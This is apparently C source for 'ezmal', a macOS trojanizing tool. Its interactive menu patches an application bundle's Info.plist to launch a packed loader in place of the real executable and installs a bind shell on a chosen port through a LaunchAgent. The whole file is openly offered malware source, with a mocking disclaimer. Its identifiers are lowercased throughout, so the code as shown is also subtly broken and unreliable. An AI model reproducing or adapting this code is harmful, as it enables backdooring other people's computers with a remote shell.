#include <stdio.h> #include <stdlib.h> #include <setjmp.h> #include <string.h> #include <errno.h> #include <unistd.h> #include <ctype.h> #include <sys/types.h> #include <sys/stat.h> #include <netdb.h> #include <arpa/inet.h> #include "common.h" /* splash */ void logo(void) { printf("\x1b[90m .-------. \n"); printf(" / \\ \n"); printf(" | )(\x1b[91m.\x1b[90m\\ /\x1b[91m.\x1b[90m)( |\n"); printf(" |/_ /_\\ _\\|\n"); printf(" '._ _.'\n"); printf(" |i\x1b[97muuuuu\x1b[90mi|\n"); printf(" \\'\x1b[97m-----\x1b[90m'/\n"); printf(" '-----'\n"); printf(" \x1b[92m ____ _____\n"); printf(" \x1b[92m/ __/ /__ /\n"); printf(" \x1b[97m\\ \\ \x1b[91mezy\x1b[97m / /\n"); printf(" \x1b[97m/ /_ \x1b[91mmal\x1b[97m / /__\n"); printf(" \x1b[92m\\___\\ /____/\x1b[0m\n"); printf("\n(c) microphone8000 <mic8000@softhome.net> 2k8\n"); printf("\nwarning: this program is for 'informational' purposes only\n"); } /* atexit/setjmp */ void unload(void) { printf("\nu \x1b[92mph33r\x1b[0m it, don't u...\n"); } jmp_buf cancelcmdbuf; void cancelcmd(void) { longjmp(cancelcmdbuf, 1); } /* buffer size */ #define buf_size 10000 /* packed data */ #include "pack.c" #include "bindshell.h" #include "loader.data" char *cu[buf_size]; void docu(void) { int i; for (i = 0; i < buf_size; i++) { if (cu[i] == null) continue; if (unlink(cu[i]) == -1) { printf("\x1b[91mdelete of '%s' failed: %s\x1b[0m\n", cu[i], strerror(errno) ); cancelcmd(); } else { printf("\x1b[96m--[ \x1b[90mdeleted: \x1b[91m%s \x1b[96m]--\x1b[0mn\n", cu[i]); } } } void initcu(void) { int i; for (i = 0; i < buf_size; i++) cu[i] = null; atexit(docu); } void addcu(char *fn) { int i; for (i = 0; i < buf_size; i++) { if (cu[i] == null) { cu[i] = fn; return; } } printf("\x1b[91mnot enough cleanup entries left to add '%s'. run 'cleanup' du0d\x1b[0m\n", fn); cancelcmd(); } /* input/string ops */ void gets2(char const * const prompt, char *buf) { printf("%s", prompt); fgets(buf, buf_size - 1, stdin); if (strlen(buf) == 0) return; buf[strlen(buf) - 1] = '\0'; } void cmdinput(char const * const msg, char *buf) { printf("%s (leave blank to cancel): ", msg); fgets(buf, buf_size - 1, stdin); if (strlen(buf) == 0) cancelcmd(); buf[strlen(buf) - 1] = '\0'; if (strlen(buf) == 0) cancelcmd(); } /* parameters */ char app[buf_size]; char servname[buf_size]; char plist[buf_size]; void updateplist(void) { snprintf(plist, buf_size - 1, bindshell_data, plist_name, servname ); } int isset(char *p) { return strcmp(p, ""); } char paramstrret[buf_size]; char *paramstr(char *pval) { if (!isset(pval)) strncpy(paramstrret, "<not set>", buf_size - 1); else strncpy(paramstrret, pval, buf_size - 1); return paramstrret; } void params(void) { printf("\x1b[96mtrojan parameters:\n"); printf("\x1b[94mapplication name: \x1b[36m%s\x1b[0m\n", paramstr(app)); struct servent *serv = getservbyname(servname, "tcp"); printf("\x1b[94mbind shell service name: \x1b[36m%s (%d)\x1b[0m\n", paramstr(servname), (serv != null ? ntohs(serv->s_port) : 0) ); } /* commands */ void done(void) { printf("\n\x1b[96m--[ \x1b[90mdone \x1b[96m]--\x1b[0m\n\n"); } struct cmd_t { char const * const name; char const * const desc; void (*f)(void); }; void help(void); void setapp(void) { char val[buf_size]; while (1) { cmdinput("e.g. for textedit.app enter 'textedit'.\nname of application", val); int i; for (i = 0; i < strlen(val); i++) { if (val[i] == '/') { printf("app must be in current working directory\n"); break; } } if (i == strlen(val)) { strncpy(app, val, buf_size - 1); return; } } } void setserv(void) { char val[buf_size]; struct servent *serv; while (1) { cmdinput("service name to bind shell to", val); serv = getservbyname(val, "tcp"); if (serv == null) printf("this time put a valid service in plz\n"); else if (ntohs(serv->s_port) <= 1024) { printf("service port must be > 1024\n"); } else { strncpy(servname, val, buf_size - 1); updateplist(); return; } } } int find(char const * const haystack, char const * const needle, int n) { int i; for (i = 0; i < n - strlen(needle); i++) { if (memcmp(haystack + i, needle, strlen(needle)) == 0) return i; } return -1; } #define fbuf_size 1048576 char appexename[fbuf_size]; char *patchinfoplist(void) { char fbuf[fbuf_size]; int fsize; char fn[buf_size]; file *fp; printf("\n\x1b[96m--[ \x1b[90mpatching info.plist\x1b[96m ]--\x1b[0m\n"); snprintf(fn, buf_size - 1, "%s.app/contents/info.plist", app); fp = fopen(fn, "rb"); if (fp == null) { printf("\x1b[31mfailz0r open of '%s'\x1b[0m. aborting\n", fn); cancelcmd(); } fsize = fread(fbuf, 1, fbuf_size - 1, fp); if (fsize <= 0) { printf("\x1b[31mfailz0r read from '%s'\x1b[0m. aborting\n", fn); cancelcmd(); } if (!feof(fp)) { printf("\x1b[31mfile buffer to small.. how fucking big iz ur info.plist??\x1b[0m. aborting\n"); fclose(fp); cancelcmd(); } fclose(fp); char *cfbundleexe = "cfbundleexecutable"; int i; i = find(fbuf, cfbundleexe, fsize); if (i == -1) { printf("\x1b[31mcfbundleexecutable not found.. ur info.plist is fux0red..\x1b[0m. aborting\n"); cancelcmd(); } char const * const stag = "<string>"; int j; j = find(&fbuf[i], stag, fsize - i); if (j == -1) { printf("\x1b[31m<string> not found after cfbundleexecutable.. ur info.plist is fux0red..\x1b[0m. aborting\n"); cancelcmd(); } j += i; j += strlen(stag); int k; k = find(&fbuf[j], "<", fsize - j); if (k == -1) { printf("\x1b[31m</string> not found after cfbundleexecutable.. ur info.plist is fux0red..\x1b[0m. aborting\n"); cancelcmd(); } k += j; memcpy(appexename, &fbuf[j], k - j); appexename[k - j] = '\0'; if (strcmp(appexename, "1") == 0) { printf("\x1b[31mduh this is already trojaned nub\x1b[0m. aborting\n"); cancelcmd(); } fp = fopen(fn, "wb"); if (fp == null) { printf("\x1b[31mfailz0r open for write of '%s'\x1b[0m. aborting\n", fn); cancelcmd(); } int r; r = fwrite(fbuf, 1, j, fp); if (r != j) { printf("\x1b[31mfailz0r write to '%s'\x1b[0m. aborting. lol i hope u backed up ur exe. u may find it iz.. bonered\n", fn); fclose(fp); cancelcmd(); } fprintf(fp, "1"); r = fwrite(&fbuf[k], 1, fsize - k, fp); if (r != fsize - k) { printf("\x1b[31mfailz0r write to '%s'\x1b[0m. aborting. lol i hope u backed up ur exe. u may find it iz.. bonered\n", fn); fclose(fp); cancelcmd(); } fclose(fp); return appexename; } void unpackloader(void) { char fn[buf_size]; snprintf(fn, buf_size - 1, "%s.app/contents/macos/1", app); strcpy(loader_data + ldr_patch_ofs, plist); unpack(fn, loader_data, loader_data_size); if (chmod(fn, 0755) == -1) { printf("couldn't make '%s' executable.. fail\n", fn); cancelcmd(); } } void renameappexe(char *appexename) { char src[buf_size]; char dst[buf_size]; char cmd[buf_size]; printf("\n\x1b[96m--[ \x1b[90mrenaming application executable\x1b[96m]--\x1b[0m\n"); snprintf(src, buf_size - 1, "%s.app/contents/macos/%s", app, appexename); snprintf(dst, buf_size - 1, "%s.app/contents/macos/2", app); snprintf(cmd, buf_size - 1, "mv -f %s %s", src, dst); system(cmd); } void trojanise(void) { if (!isset(app)) { printf("\x1b[90mset a fukn app du0d!@@!\x1b[0m\n"); cancelcmd(); } if (!isset(servname)) { printf("\x1b[90mset serv name plz..\x1b[0m\n"); cancelcmd(); } printf("\x1b[96m--[ \x1b[90mhacking mode: \x1b[91m\x1b[5mengaged\x1b[0m \x1b[96m]--\x1b[0m\n"); char *appexename; appexename = patchinfoplist(); unpackloader(); renameappexe(appexename); } void rmshell(void) { printf("\x1b[32mlame\x1b[0m\n"); char cmd[buf_size]; snprintf(cmd, buf_size - 1, "rm -f ~/library/launchagents/%s", plist_name); system(cmd); addcu("tmp.plist"); unpack("tmp.plist", plist, strlen(plist)); system("cp tmp.plist ~/library/launchagents"); system("launchctl unload ~/library/launchagents"); system("rm ~/library/launchagents/tmp.plist"); system("launchctl load ~/library/launchagents"); } void doexit(void) { exit(0); } struct cmd_t cmds[] = { {"help", "display a list of commands.", help}, {"app", "set target application.", setapp}, {"serv", "service name from /etc/services (determines port).", setserv}, {"params", "show parameters.", params}, {"rmshell", "remove trojan from this account.", rmshell}, {"hack", "\x1b[91mtr0jan1ze!!!@!@!\x1b[0m", trojanise}, {"cleanup", "delete unpacked files", docu}, {"exit", "terminate ezmal", doexit}, {null, null, null} }; void help(void) { struct cmd_t *p; printf("\x1b[90mcommands:\n"); for (p = cmds; p->name != null; p++) printf("\x1b[91m%s\t\t\x1b[93m%s\n", p->name, p->desc); printf("\x1b[0m"); } /* main loop */ void cmdloop(void) { char cmd[buf_size]; setjmp(cancelcmdbuf); while (!feof(stdin)) { gets2("\x1b[31m>>>\x1b[32m", cmd); printf("\x1b[0m"); int found = 0; struct cmd_t *p; for (p = cmds; p->name != null; p++) { if (strcmp(p->name, cmd)) continue; printf("\x1b[96m--[ \x1b[90mcommand: \x1b[91m%s \x1b[96m]--\x1b[0m\n\n", cmd); found = 1; p->f(); done(); } if (!found) printf("lol what??? \x1b[93mnewb\n\x1b[0m"); } } int main(void) { atexit(unload); initcu(); updateplist(); logo(); cmdloop(); return 0; } 